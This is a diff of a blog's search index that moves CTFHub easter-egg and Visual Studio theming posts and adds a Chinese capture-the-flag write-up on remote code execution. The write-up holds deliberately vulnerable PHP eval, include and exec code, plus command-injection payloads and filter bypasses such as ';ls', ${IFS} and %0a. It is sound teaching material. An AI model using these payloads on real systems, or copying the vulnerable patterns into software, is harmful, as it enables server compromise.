@@ -175,6 +175,31 @@
       </categories>
   </entry>
   <entry>
+    <title>ctfhub-彩蛋</title>
+    <url>/2022/02/CTFHub%E5%BD%A9%E8%9B%8B/</url>
+    <content><![CDATA[<h2 id="工具-彩蛋"><a href="#工具-彩蛋" class="headerlink" title="工具 彩蛋"></a>工具 彩蛋</h2><p>一开始的想法是工具一共有 8 页，想抓个包改下看看有没有第九页<br>抓包后发现不管哪一页 limit 都是 12 但 offset 在变化<br>于是<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254043338-28.png" alt="在这里插入图片描述">这样设置参数<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254045357-31.png" alt="在这里插入图片描述">在长度为 1000 到 6、7 千左右随便一个双击后 <code>点击响应</code> 看<code>响应</code>包<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254048636-34.png" alt="在这里插入图片描述">在最后一行</p>
+<h2 id="首页-彩蛋"><a href="#首页-彩蛋" class="headerlink" title="首页 彩蛋"></a>首页 彩蛋</h2><p><a href="https://api.ctfhub.com/">api</a>中间框内隐藏着两行字<br>ctfhub{c18732f48a96c40d40a06e74b1305706}<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254050970-37.png" alt="在这里插入图片描述"></p>
+<h2 id="题目入口-彩蛋"><a href="#题目入口-彩蛋" class="headerlink" title="题目入口 彩蛋"></a>题目入口 彩蛋</h2><p>在 web-ssrf 中间那一列的某些题传参错误时会出现<br>详情见<a href="https://blog.csdn.net/qq_62414126/article/details/122881838">ctfhub-ssrf</a>post 最后一行介绍</p>
+<h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p>公众号彩蛋坑的一批！<br>首先要先绑定<br>然后点彩蛋<br>它提示要回复正确的关键词<br>我*#@%<br>我回复过</p>
+<blockquote>
+<p>彩蛋 关键词 egg ctfhub CTFHub 拿来把你 CTFer 自己人 ……</p>
+</blockquote>
+<p>到底没想到竟然是 flag</p>
+<h2 id="投稿提交-彩蛋"><a href="#投稿提交-彩蛋" class="headerlink" title="投稿提交 彩蛋"></a>投稿提交 彩蛋</h2><p>只找到了前半部分<br>分别在题目提交和 wp 提交页面的最后</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">ctfhub&#123;<span class="number">029</span>e02eb3a1</span><br><span class="line">	e8c49b1132b5</span><br><span class="line">	<span class="number">15</span>b652a5f3a8</span><br><span class="line">	<span class="number">62013</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后这个彩蛋剩余部分也没找到<br>网上搜了下才明白：感谢 anweilx 的<a href="https://www.cnblogs.com/anweilx/p/12493000.html">wp</a><br>第一行是俩页面的最后有<br>第二行是在俩页面源码 分别搜<code>奖励</code> 在上面那行一个是 base64 然后再转 url 一个是 hex 解码<br>第三行是俩页面的图片隐写 丢进 winhex<br>第四行有提示<br>aes 256 ecb<a href="http://tool.chacuo.net/cryptaes/">解码</a></p>
+<h2 id="其他彩蛋"><a href="#其他彩蛋" class="headerlink" title="其他彩蛋"></a>其他彩蛋</h2><p>剩余皆可在对应页面搜索 egg 即可获得</p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctfhub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Bypass disable_function</title>
     <url>/2022/05/Bypass%20disable_function/</url>
     <content><![CDATA[<h2 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h2><p>时间紧 于是先采用最省时的方法<br>先蚁剑连<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="在这里插入图片描述"><br>发现打不开 flag 文件<br>要使用蚁剑插件<code>绕过disabled function</code></p>
@@ -248,31 +273,6 @@
       </tags>
   </entry>
   <entry>
-    <title>ctfhub-彩蛋</title>
-    <url>/2022/02/CTFHub%E5%BD%A9%E8%9B%8B/</url>
-    <content><![CDATA[<h2 id="工具-彩蛋"><a href="#工具-彩蛋" class="headerlink" title="工具 彩蛋"></a>工具 彩蛋</h2><p>一开始的想法是工具一共有 8 页，想抓个包改下看看有没有第九页<br>抓包后发现不管哪一页 limit 都是 12 但 offset 在变化<br>于是<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254043338-28.png" alt="在这里插入图片描述">这样设置参数<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254045357-31.png" alt="在这里插入图片描述">在长度为 1000 到 6、7 千左右随便一个双击后 <code>点击响应</code> 看<code>响应</code>包<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254048636-34.png" alt="在这里插入图片描述">在最后一行</p>
-<h2 id="首页-彩蛋"><a href="#首页-彩蛋" class="headerlink" title="首页 彩蛋"></a>首页 彩蛋</h2><p><a href="https://api.ctfhub.com/">api</a>中间框内隐藏着两行字<br>ctfhub{c18732f48a96c40d40a06e74b1305706}<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254050970-37.png" alt="在这里插入图片描述"></p>
-<h2 id="题目入口-彩蛋"><a href="#题目入口-彩蛋" class="headerlink" title="题目入口 彩蛋"></a>题目入口 彩蛋</h2><p>在 web-ssrf 中间那一列的某些题传参错误时会出现<br>详情见<a href="https://blog.csdn.net/qq_62414126/article/details/122881838">ctfhub-ssrf</a>post 最后一行介绍</p>
-<h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p>公众号彩蛋坑的一批！<br>首先要先绑定<br>然后点彩蛋<br>它提示要回复正确的关键词<br>我*#@%<br>我回复过</p>
-<blockquote>
-<p>彩蛋 关键词 egg ctfhub CTFHub 拿来把你 CTFer 自己人 ……</p>
-</blockquote>
-<p>到底没想到竟然是 flag</p>
-<h2 id="投稿提交-彩蛋"><a href="#投稿提交-彩蛋" class="headerlink" title="投稿提交 彩蛋"></a>投稿提交 彩蛋</h2><p>只找到了前半部分<br>分别在题目提交和 wp 提交页面的最后</p>
-<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">ctfhub&#123;<span class="number">029</span>e02eb3a1</span><br><span class="line">	e8c49b1132b5</span><br><span class="line">	<span class="number">15</span>b652a5f3a8</span><br><span class="line">	<span class="number">62013</span>&#125;</span><br></pre></td></tr></table></figure>
-
-<p>最后这个彩蛋剩余部分也没找到<br>网上搜了下才明白：感谢 anweilx 的<a href="https://www.cnblogs.com/anweilx/p/12493000.html">wp</a><br>第一行是俩页面的最后有<br>第二行是在俩页面源码 分别搜<code>奖励</code> 在上面那行一个是 base64 然后再转 url 一个是 hex 解码<br>第三行是俩页面的图片隐写 丢进 winhex<br>第四行有提示<br>aes 256 ecb<a href="http://tool.chacuo.net/cryptaes/">解码</a></p>
-<h2 id="其他彩蛋"><a href="#其他彩蛋" class="headerlink" title="其他彩蛋"></a>其他彩蛋</h2><p>剩余皆可在对应页面搜索 egg 即可获得</p>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>ctfhub</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>PyJail python沙箱逃逸探究</title>
     <url>/2023/02/PyJail%20python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%8E%A2%E7%A9%B6/</url>
     <content><![CDATA[<h2 id="python-特性"><a href="#python-特性" class="headerlink" title="python 特性"></a>python 特性</h2><p>在 python 中，类均继承自<code>object</code>基类；</p>
@@ -341,34 +341,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Visual Studio 2022界面美化教程</title>
-    <url>/2021/12/Visual%20Studio%202022%E7%95%8C%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B/</url>
-    <content><![CDATA[<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254207258-133.png" alt="点击并拖拽以移动"></p>
-<p>我之前用的是 2019 版本，后来有出新版我也没管，直到前几天他给我推送 2022 版了，查了下大部分都是好评（bug 恐惧症和恋旧），于是我决定入 2022 版了，但又怕我在 2019 调好的设置用不到 2022 上，于是暂时让两个版本共存，等 2022 调试好了再说 2019 的事。</p>
-<p>这是我在 2019 上美化用到的插件和设置（因为网上类似的不少，但 2022 版貌似没有人发过，所以我决定写这篇文章）</p>
-<p>不出所料，2022 版好多东西更新，导致一些东西不能用了，导入 2019 版甚至文件的时候，有一部分报错了，要不然就是改名了，要不然就是更新换代了，没大有影响，以萌新目前来看，是往好的方向发展了。</p>
-<p>但是我的那些美化插件直接搜名字的话是找不到了，于是我就在那找替代品，就找到了这两个插件。</p>
-<p>第一个插件，是 2019 版变的，变了样之后差点给我整不会了，它是类似于编程。</p>
-<p>新建项目 C#里面最后一项</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254210315-136.png" alt="点击并拖拽以移动"></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254212027-139.png" alt="da3a0ac9713d4b289c4351ca0ac8835d.png"></p>
-<p>创建之后，把 2019 版的该插件里的美化设置导出，然后重命名为 CustomTheme.vstheme</p>
-<p>然后复制到你新创建的 2022 版那个项目里，选择替换更新，之后项目文件夹里.sln 后缀的那个文件打开，选择你之前那个配置的名字，然后运行，不管他蹦出来啥弹窗，等他一打开接着关了就好，之后重启 visualstudio 就可以了</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254213778-142.png" alt="点击并拖拽以移动"></p>
-<p>这个插件是为后面设置背景图片准备</p>
-<p>第二个插件我原来用的是 moeIDE，但是 2022 版它不支持了，所以就用新插件代替了。</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254216001-145.png" alt="点击并拖拽以移动"></p>
-<p>背景图是 B 站 1024 节发布的一张壁纸，我用 ps 调了下对比度，让他更鲜艳一些</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254218564-148.png" alt="点击并拖拽以移动"></p>
-]]></content>
-      <categories>
-        <category>教程</category>
-      </categories>
-      <tags>
-        <tag>visual studio 2022</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SSTI模板注入</title>
     <url>/2022/10/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/12ec799b41b544eb83db7a111956c0cb.png" alt="在这里插入图片描述"></p>
@@ -395,6 +367,34 @@
         <tag>web</tag>
         <tag>SSTI</tag>
         <tag>模板注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Visual Studio 2022界面美化教程</title>
+    <url>/2021/12/Visual%20Studio%202022%E7%95%8C%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B/</url>
+    <content><![CDATA[<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254207258-133.png" alt="点击并拖拽以移动"></p>
+<p>我之前用的是 2019 版本，后来有出新版我也没管，直到前几天他给我推送 2022 版了，查了下大部分都是好评（bug 恐惧症和恋旧），于是我决定入 2022 版了，但又怕我在 2019 调好的设置用不到 2022 上，于是暂时让两个版本共存，等 2022 调试好了再说 2019 的事。</p>
+<p>这是我在 2019 上美化用到的插件和设置（因为网上类似的不少，但 2022 版貌似没有人发过，所以我决定写这篇文章）</p>
+<p>不出所料，2022 版好多东西更新，导致一些东西不能用了，导入 2019 版甚至文件的时候，有一部分报错了，要不然就是改名了，要不然就是更新换代了，没大有影响，以萌新目前来看，是往好的方向发展了。</p>
+<p>但是我的那些美化插件直接搜名字的话是找不到了，于是我就在那找替代品，就找到了这两个插件。</p>
+<p>第一个插件，是 2019 版变的，变了样之后差点给我整不会了，它是类似于编程。</p>
+<p>新建项目 C#里面最后一项</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254210315-136.png" alt="点击并拖拽以移动"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254212027-139.png" alt="da3a0ac9713d4b289c4351ca0ac8835d.png"></p>
+<p>创建之后，把 2019 版的该插件里的美化设置导出，然后重命名为 CustomTheme.vstheme</p>
+<p>然后复制到你新创建的 2022 版那个项目里，选择替换更新，之后项目文件夹里.sln 后缀的那个文件打开，选择你之前那个配置的名字，然后运行，不管他蹦出来啥弹窗，等他一打开接着关了就好，之后重启 visualstudio 就可以了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254213778-142.png" alt="点击并拖拽以移动"></p>
+<p>这个插件是为后面设置背景图片准备</p>
+<p>第二个插件我原来用的是 moeIDE，但是 2022 版它不支持了，所以就用新插件代替了。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254216001-145.png" alt="点击并拖拽以移动"></p>
+<p>背景图是 B 站 1024 节发布的一张壁纸，我用 ps 调了下对比度，让他更鲜艳一些</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254218564-148.png" alt="点击并拖拽以移动"></p>
+]]></content>
+      <categories>
+        <category>教程</category>
+      </categories>
+      <tags>
+        <tag>visual studio 2022</tag>
       </tags>
   </entry>
   <entry>
@@ -465,6 +465,76 @@
         <tag>awd</tag>
         <tag>长城杯</tag>
         <tag>铁人三项</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfhub-rce</title>
+    <url>/2022/04/ctfhub-rce/</url>
+    <content><![CDATA[<p>rce：远程代码执行漏洞<br>分为远程命令执行 ping 和远程代码执行 evel。<br><strong>其实这就是一个接口，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是 RCE 漏洞</strong>。相当于直接操控服务器电脑的 cmd 命令行！高危漏洞！</p>
+<h2 id="eval-执行"><a href="#eval-执行" class="headerlink" title="eval 执行"></a>eval 执行</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>传参给 cmd 来 eval</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?cmd=<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls /&quot;</span>);<span class="comment">//此处因为根目录无flag 所以看上一级目录</span></span><br></pre></td></tr></table></figure>
+
+<p>找到后 再 cat &#x2F;flag_****</p>
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>这里使用 strpos 函数</p>
+<blockquote>
+<p>strpos:查找字符串首次出现的位置</p>
+<p>int strpos ( string $haystack , mixed $needle [, int $offset &#x3D; 0 ] )</p>
+</blockquote>
+<p>题目使用</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>],<span class="string">&quot;flag&quot;</span>))&#123;<span class="comment">//无flag字符即可运行</span></span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>来包含文件，而下方给出的 shell.txt 含有 eval 漏洞</p>
+<p>于是包含它（shell.txt 没有“flag”字符 所以这里 strpos 没影响）</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220218182857507.png" alt="image-20220218182857507"></p>
+<p>通过 get(包含文件) post(传参)并用来得到 flag</p>
+<h2 id="php-info"><a href="#php-info" class="headerlink" title="php info"></a>php info</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">	if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) &#123;</span><br><span class="line">        include($_GET[&quot;file&quot;]);</span><br><span class="line">         &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;Hacker!!!&quot;;</span><br><span class="line">    	&#125;&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    highlight_file(__FILE__);&#125;?&gt;</span><br><span class="line">&lt;hr&gt;i don&#x27;t have shell, how to get flag? &lt;br&gt;&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>点击 phpinfo 链接 可查看 php 环境</p>
+<h3 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*php:// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，   内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">php://input是个可以访问请求的原始数据的只读流。</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220218162728184.png" alt="image-20220218162728184"></p>
+<h2 id="读取源代码"><a href="#读取源代码" class="headerlink" title="读取源代码"></a>读取源代码</h2><p>看环境 无法使用 php:&#x2F;&#x2F;input</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">if (isset($_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) &#123;</span><br><span class="line">        include($_GET[&quot;file&quot;]);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Hacker!!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>但还必须是 php:&#x2F;&#x2F;开头</p>
+<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a><a href="https://www.php.net/manual/zh/wrappers.php.php">php:&#x2F;&#x2F;filter</a></h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220219174206504.png" alt="image-20220219174206504"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220219112308277.png" alt="image-20220219112308277"></p>
+<h2 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h2><p>同 phpinfo 做法相同</p>
+<h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>输入命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1;ls</span><br></pre></td></tr></table></figure>
+
+<p>然后 cat 时出现了问题</p>
+<p>输出被限制了</p>
+<p>于是用管道符号来限制输出 base64</p>
+<p>得到后再解码</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220218170811553.png" alt="image-20220218170811553"></p>
+<h2 id="过滤-cat"><a href="#过滤-cat" class="headerlink" title="过滤 cat"></a>过滤 cat</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$res = FALSE;</span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/cat/&quot;, $ip, $m)) &#123;//过滤了cat</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    if ($res) &#123;</span><br><span class="line">        print_r($res);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	show_source(__FILE__);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="more"><a href="#more" class="headerlink" title="more"></a>more</h2><p>Linux more 命令类似 cat ，不过会以一页一页的形式显示，更方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示，而且还有搜寻字串的功能（与 vi 相似），使用中的说明文件，请按 h 。</p>
+<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">more <span class="section">[-dlfpcsu]</span> <span class="section">[-num]</span> <span class="section">[+/pattern]</span> <span class="section">[+linenum]</span> <span class="section">[fileNames..]</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220218171602745.png" alt="image-20220218171602745"></p>
+<h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>在 linux 里空格可用&lt; 或 ${IFS}代替</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220218171910282.png" alt="image-20220218171910282"></p>
+<h2 id="过滤运算符"><a href="#过滤运算符" class="headerlink" title="过滤运算符"></a>过滤运算符</h2><p>cat [file]|base64 还可以用 base64 [file]</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$res = FALSE;</span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/(\||\&amp;)/&quot;, $ip, $m)) &#123;</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220219104650896.png" alt="image-20220219104650896"></p>
+<h2 id="综合练习"><a href="#综合练习" class="headerlink" title="综合练习"></a>综合练习</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">!<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;</span>, <span class="variable">$ip</span></span><br></pre></td></tr></table></figure>
+
+<p>;可以用%0a(url 编码) cat 用 base64 flag 用正则 f*** *lag 等 空格用 ${IFS}</p>
